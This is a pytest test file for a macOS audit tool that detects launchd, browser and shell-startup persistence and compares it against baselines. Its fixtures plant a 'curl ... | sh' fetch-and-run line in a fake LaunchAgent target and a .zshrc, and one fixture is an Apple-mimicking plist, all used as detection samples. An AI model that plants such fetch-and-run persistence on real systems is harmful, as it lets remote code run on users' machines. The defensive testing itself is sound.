from __future__ import annotations

import json
import os
import plistlib
from pathlib import Path

from mac_audit_agent.assessment import build_security_assessment
from mac_audit_agent.models import BackgroundMonitorStatus
from mac_audit_agent.persistence_intelligence.baseline import PersistenceBaselineManager
from mac_audit_agent.persistence_intelligence.chain_view import build_chain_view
from mac_audit_agent.persistence_intelligence.report_adapter import (
    export_persistence_report_html,
    export_persistence_report_json,
    persistence_findings_as_msaa_findings,
    persistence_findings_as_sarif_inputs,
)
from mac_audit_agent.persistence_intelligence.risk_scoring import score_item
from mac_audit_agent.persistence_intelligence.scanner import BrowserPersistenceScanner, LaunchdScanner, PersistenceIntelligenceEngine, ScanContext, ShellStartupScanner
from mac_audit_agent.persistence_intelligence.timeline import build_timeline, export_timeline
from mac_audit_agent.persistence_intelligence.trust_reputation import score_trust
from mac_audit_agent.persistence_intelligence.watch import events_from_baseline_changes
from mac_audit_agent.quality.audit_models import AuditContext
from mac_audit_agent.quality.persistence_auditor import run_persistence_audit
from mac_audit_agent.ui.risk_colors import normalize_risk_label


def _write_launch_agent(root: Path, *, label: str = "com.example.agent", target: Path | None = None) -> Path:
    launch_agents = root / "Library" / "LaunchAgents"
    launch_agents.mkdir(parents=True)
    target = target or (root / "agent.sh")
    target.write_text("#!/bin/sh\ncurl https://example.invalid/install.sh | sh\n", encoding="utf-8")
    target.chmod(0o755)
    plist_path = launch_agents / f"{label}.plist"
    plist_path.write_bytes(
        plistlib.dumps(
            {
                "Label": label,
                "ProgramArguments": [str(target), "--flag"],
                "RunAtLoad": True,
                "KeepAlive": True,
            }
        )
    )
    return plist_path


def test_launchd_scanner_parses_program_arguments_runatload_keepalive(tmp_path: Path) -> None:
    plist_path = _write_launch_agent(tmp_path)
    result = LaunchdScanner().scan(ScanContext(home=tmp_path))
    item = next(item for item in result.items if item.plist_path == str(plist_path))
    assert item.label == "com.example.agent"
    assert item.program_arguments[0].endswith("agent.sh")
    assert item.run_at_load is True
    assert item.keep_alive is True
    assert item.target_exists is True
    assert item.risk_score > 0


def test_launchd_scanner_parses_launchdaemon_and_disabled_state(tmp_path: Path) -> None:
    daemon_dir = tmp_path / "Library" / "LaunchDaemons"
    daemon_dir.mkdir(parents=True)
    target = tmp_path / "daemon.sh"
    target.write_text("#!/bin/sh\n", encoding="utf-8")
    target.chmod(0o755)
    plist_path = daemon_dir / "com.example.daemon.plist"
    plist_path.write_bytes(
        plistlib.dumps(
            {
                "Label": "com.example.daemon",
                "Program": str(target),
                "RunAtLoad": False,
                "KeepAlive": False,
                "Disabled": True,
            }
        )
    )
    result = LaunchdScanner().scan(ScanContext(home=tmp_path / "home", system_root=tmp_path))
    item = next(item for item in result.items if item.plist_path == str(plist_path))
    assert item.mechanism == "launch_daemon"
    assert item.program == str(target)
    assert item.disabled is True


def test_world_writable_plist_increases_risk(tmp_path: Path) -> None:
    plist_path = _write_launch_agent(tmp_path)
    plist_path.chmod(0o666)
    result = LaunchdScanner().scan(ScanContext(home=tmp_path, system_root=tmp_path))
    item = next(item for item in result.items if item.plist_path == str(plist_path))
    assert item.world_writable is True
    assert any("world-writable" in evidence for evidence in item.evidence)


def test_missing_temp_target_and_suspicious_command_increase_risk(tmp_path: Path) -> None:
    missing = Path(f"/private/tmp/msaa_missing_persistence_target_{tmp_path.name}")
    missing.unlink(missing_ok=True)
    launch_agents = tmp_path / "Library" / "LaunchAgents"
    launch_agents.mkdir(parents=True)
    plist_path = launch_agents / "com.apple.fake.plist"
    plist_path.write_bytes(
        plistlib.dumps(
            {
                "Label": "com.apple.fake",
                "ProgramArguments": [str(missing), "curl", "https://example.invalid/a.sh"],
                "RunAtLoad": True,
                "KeepAlive": True,
            }
        )
    )
    result = LaunchdScanner().scan(ScanContext(home=tmp_path))
    item = next(item for item in result.items if item.plist_path == str(plist_path))
    assert item.target_exists is False
    assert item.risk_level in {"HIGH", "CRITICAL"}
    assert any("remote URL" in evidence or "temporary" in evidence or "mimics Apple" in evidence for evidence in item.evidence)


def test_homebrew_unsigned_alone_does_not_become_critical() -> None:
    from mac_audit_agent.persistence_intelligence.models import PersistenceItem

    item = PersistenceItem.create("launch_agent", "/Users/test/Library/LaunchAgents/homebrew.plist", label="homebrew.mxcl.service", executable_path="/opt/homebrew/bin/tool", signed_status="unsigned")
    score_trust(item)
    score_item(item)
    assert item.risk_level != "CRITICAL"


def test_browser_native_messaging_host_parsed(tmp_path: Path) -> None:
    host_dir = tmp_path / "Library" / "Application Support" / "Google" / "Chrome" / "NativeMessagingHosts"
    host_dir.mkdir(parents=True)
    helper = tmp_path / "helper"
    helper.write_text("#!/bin/sh\n", encoding="utf-8")
    helper.chmod(0o755)
    (host_dir / "com.example.native.json").write_text(json.dumps({"name": "com.example.native", "path": str(helper)}), encoding="utf-8")
    result = BrowserPersistenceScanner().scan(ScanContext(home=tmp_path))
    assert any(item.mechanism == "native_messaging_host" and item.executable_path == str(helper) for item in result.items)


def test_shell_startup_scanner_redacts_to_relevant_command_patterns(tmp_path: Path) -> None:
    shell_file = tmp_path / ".zshrc"
    shell_file.write_text("export TOKEN=secret\ncurl https://example.invalid/a.sh | sh\n", encoding="utf-8")
    result = ShellStartupScanner().scan(ScanContext(home=tmp_path))
    item = next(item for item in result.items if item.path == str(shell_file))
    assert "curl" in " ".join(item.program_arguments)
    assert "TOKEN=secret" not in " ".join(item.program_arguments)


def test_baseline_detects_added_removed_and_modified(tmp_path: Path) -> None:
    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    manager = PersistenceBaselineManager(tmp_path / "baselines")
    manager.create_baseline("trusted", report.items)
    changed_target = tmp_path / "agent.sh"
    changed_target.write_text("#!/bin/sh\necho changed\n", encoding="utf-8")
    changed_report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    comparison = manager.compare_baseline("trusted", changed_report.items)
    assert comparison["status"] == "compared"
    assert comparison["modified"] or comparison["hash_changed"]
    os.remove(tmp_path / "Library" / "LaunchAgents" / "com.example.agent.plist")
    removed_report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    removed = manager.compare_baseline("trusted", removed_report.items)
    assert removed["removed"]


def test_baseline_detects_disabled_and_loaded_state_changes(tmp_path: Path) -> None:
    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path, system_root=tmp_path), scanners=[LaunchdScanner()]).scan()
    manager = PersistenceBaselineManager(tmp_path / "baselines")
    manager.create_baseline("trusted", report.items)
    changed = report.items[0]
    changed.disabled = not changed.disabled
    changed.loaded = not changed.loaded
    comparison = manager.compare_baseline("trusted", [changed])
    assert comparison["disabled_state_changed"]
    assert comparison["loaded_state_changed"]


def test_watch_events_include_added_removed_modified_and_hash_changed(tmp_path: Path) -> None:
    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path, system_root=tmp_path), scanners=[LaunchdScanner()]).scan()
    item = report.items[0]
    changes = {
        "added": [item.to_dict()],
        "removed": [item.to_dict()],
        "modified": [{"after": item.to_dict()}],
        "hash_changed": [item.to_dict()],
    }
    events = events_from_baseline_changes(changes, report.items)
    event_types = {event.event_type for event in events}
    assert "launchagent_added" in event_types
    assert "launchagent_removed" in event_types
    assert "persistence_item_modified" in event_types
    assert "persistence_target_hash_changed" in event_types


def test_timeline_chain_and_reports_export(tmp_path: Path) -> None:
    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    timeline = build_timeline(report.items)
    chains = build_chain_view(report.items, report.findings)
    assert timeline
    assert chains
    assert export_timeline(timeline, tmp_path / "timeline.md", "md").exists()
    html_path = export_persistence_report_html(report, tmp_path / "report.html")
    json_path = export_persistence_report_json(report, tmp_path / "report.json")
    html = html_path.read_text(encoding="utf-8")
    payload = json.loads(json_path.read_text(encoding="utf-8"))
    assert "Persistence Intelligence Report" in html
    assert "risk-badge" in html
    assert payload["items"]
    assert payload["items"][0]["risk_color"]["background"].startswith("#")
    msaa_findings = persistence_findings_as_msaa_findings(report)
    sarif_inputs = persistence_findings_as_sarif_inputs(report)
    assert msaa_findings
    assert sarif_inputs
    assert msaa_findings[0]["category"] == "Admin & Persistence"
    assert sarif_inputs[0]["rule_id"].startswith("MSAA.Persistence.")


def test_persistence_intelligence_tables_style_risk_cells(tmp_path: Path) -> None:
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QApplication

    from mac_audit_agent.ui.persistence_intelligence_panel import PersistenceIntelligencePanel

    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    app = QApplication.instance() or QApplication([])
    panel = PersistenceIntelligencePanel()
    panel.report = report
    panel._render_report()

    risk_item = panel.inventory_table.item(0, 0)
    score_item = panel.inventory_table.item(0, 1)
    trust_item = panel.inventory_table.item(0, 2)
    finding_severity = panel.findings_table.item(0, 0)
    timeline_severity = panel.timeline_table.item(0, 2)

    assert risk_item.text()
    assert risk_item.toolTip()
    assert risk_item.data(Qt.UserRole) is not None
    assert score_item.toolTip()
    assert trust_item.toolTip()
    assert finding_severity.toolTip()
    assert timeline_severity.toolTip()
    assert panel.chain_text.toPlainText()
    assert any(label in panel.chain_text.toPlainText() for label in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO", "UNKNOWN", "TRUSTED", "SUSPICIOUS"])
    panel.close()
    app.processEvents()


def test_persistence_dashboard_empty_state_and_required_columns() -> None:
    from PySide6.QtWidgets import QApplication

    from mac_audit_agent.ui.persistence_intelligence_panel import PersistenceIntelligencePanel

    app = QApplication.instance() or QApplication([])
    panel = PersistenceIntelligencePanel()
    assert "No persistence scan has been run yet" in panel.dashboard_state_label.text()
    for value_label, detail_label in panel.summary_cards.values():
        assert value_label.text().strip()
        assert detail_label.text().strip()
    finding_headers = [panel.findings_table.horizontalHeaderItem(index).text() for index in range(panel.findings_table.columnCount())]
    inventory_headers = [panel.inventory_table.horizontalHeaderItem(index).text() for index in range(panel.inventory_table.columnCount())]
    for header in ["Severity", "Risk", "Confidence", "Mechanism", "Name / Label", "Target Path", "Owner", "Signature", "Baseline Status", "Why Flagged", "Recommended Action", "First Seen", "Status"]:
        assert header in finding_headers
    for header in ["Mechanism", "Label / Name", "Path", "Target", "Loaded", "Disabled", "RunAtLoad", "KeepAlive", "Owner", "Permissions", "Signature", "Trust", "Risk", "Baseline"]:
        assert header in inventory_headers
    assert "Select a persistence finding" in panel.finding_detail.toPlainText()
    panel.close()
    app.processEvents()


def test_persistence_dashboard_summary_top_risks_and_detail_pane(tmp_path: Path) -> None:
    from PySide6.QtWidgets import QApplication

    from mac_audit_agent.ui.persistence_intelligence_panel import PersistenceIntelligencePanel

    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path), scanners=[LaunchdScanner()]).scan()
    app = QApplication.instance() or QApplication([])
    panel = PersistenceIntelligencePanel()
    panel.report = report
    panel._render_report()

    for value_label, detail_label in panel.summary_cards.values():
        assert value_label.text().strip()
        assert detail_label.text().strip()
        assert value_label.text() != ""
    assert panel.top_risks_table.rowCount() <= 10
    assert panel.mechanism_table.rowCount() >= 1
    assert panel.dashboard_coverage_table.rowCount() >= 1
    assert panel.scanner_filter.findText("launchd") >= 0
    panel.scanner_filter.setCurrentText("launchd")
    assert panel.inventory_table.rowCount() >= 1
    panel.findings_table.selectRow(0)
    panel._show_selected_finding_detail(0, 0, -1, -1)
    details = panel.finding_detail.toPlainText()
    assert "Severity:" in details
    assert "Suggested fix:" in details
    assert "MITRE / NIST:" in details
    panel.search_box.setText("definitely-no-match")
    assert "No persistence findings detected" in panel.finding_detail.toPlainText()
    panel.close()
    app.processEvents()


def test_persistence_intelligence_feeds_security_assessment(tmp_path: Path) -> None:
    _write_launch_agent(tmp_path)
    report = PersistenceIntelligenceEngine(ScanContext(home=tmp_path, system_root=tmp_path), scanners=[LaunchdScanner()]).scan()
    assessment = build_security_assessment(
        None,
        BackgroundMonitorStatus(status_text="healthy"),
        [],
        {},
        persistence_intelligence=report.to_dict(),
    )
    assert assessment.admin_persistence_summary["persistence_intelligence_item_count"] >= 1
    assert assessment.diagnostics["persistence_intelligence_loaded"] is True


def test_pre_uat_persistence_audit_runs(tmp_path: Path) -> None:
    checks = run_persistence_audit(AuditContext(tmp_path / "audit.sqlite", tmp_path))
    assert any(check.check_id == "persistence.registry" and check.status == "PASS" for check in checks)
    assert all(check.recommended_fix or check.status in {"PASS", "SKIPPED"} for check in checks)


def test_no_destructive_persistence_actions_exposed() -> None:
    import mac_audit_agent.persistence_intelligence.scanner as scanner

    source = Path(scanner.__file__).read_text(encoding="utf-8").lower()
    assert "unlink(" not in source
    assert "rmtree" not in source
    assert "launchctl bootout" not in source
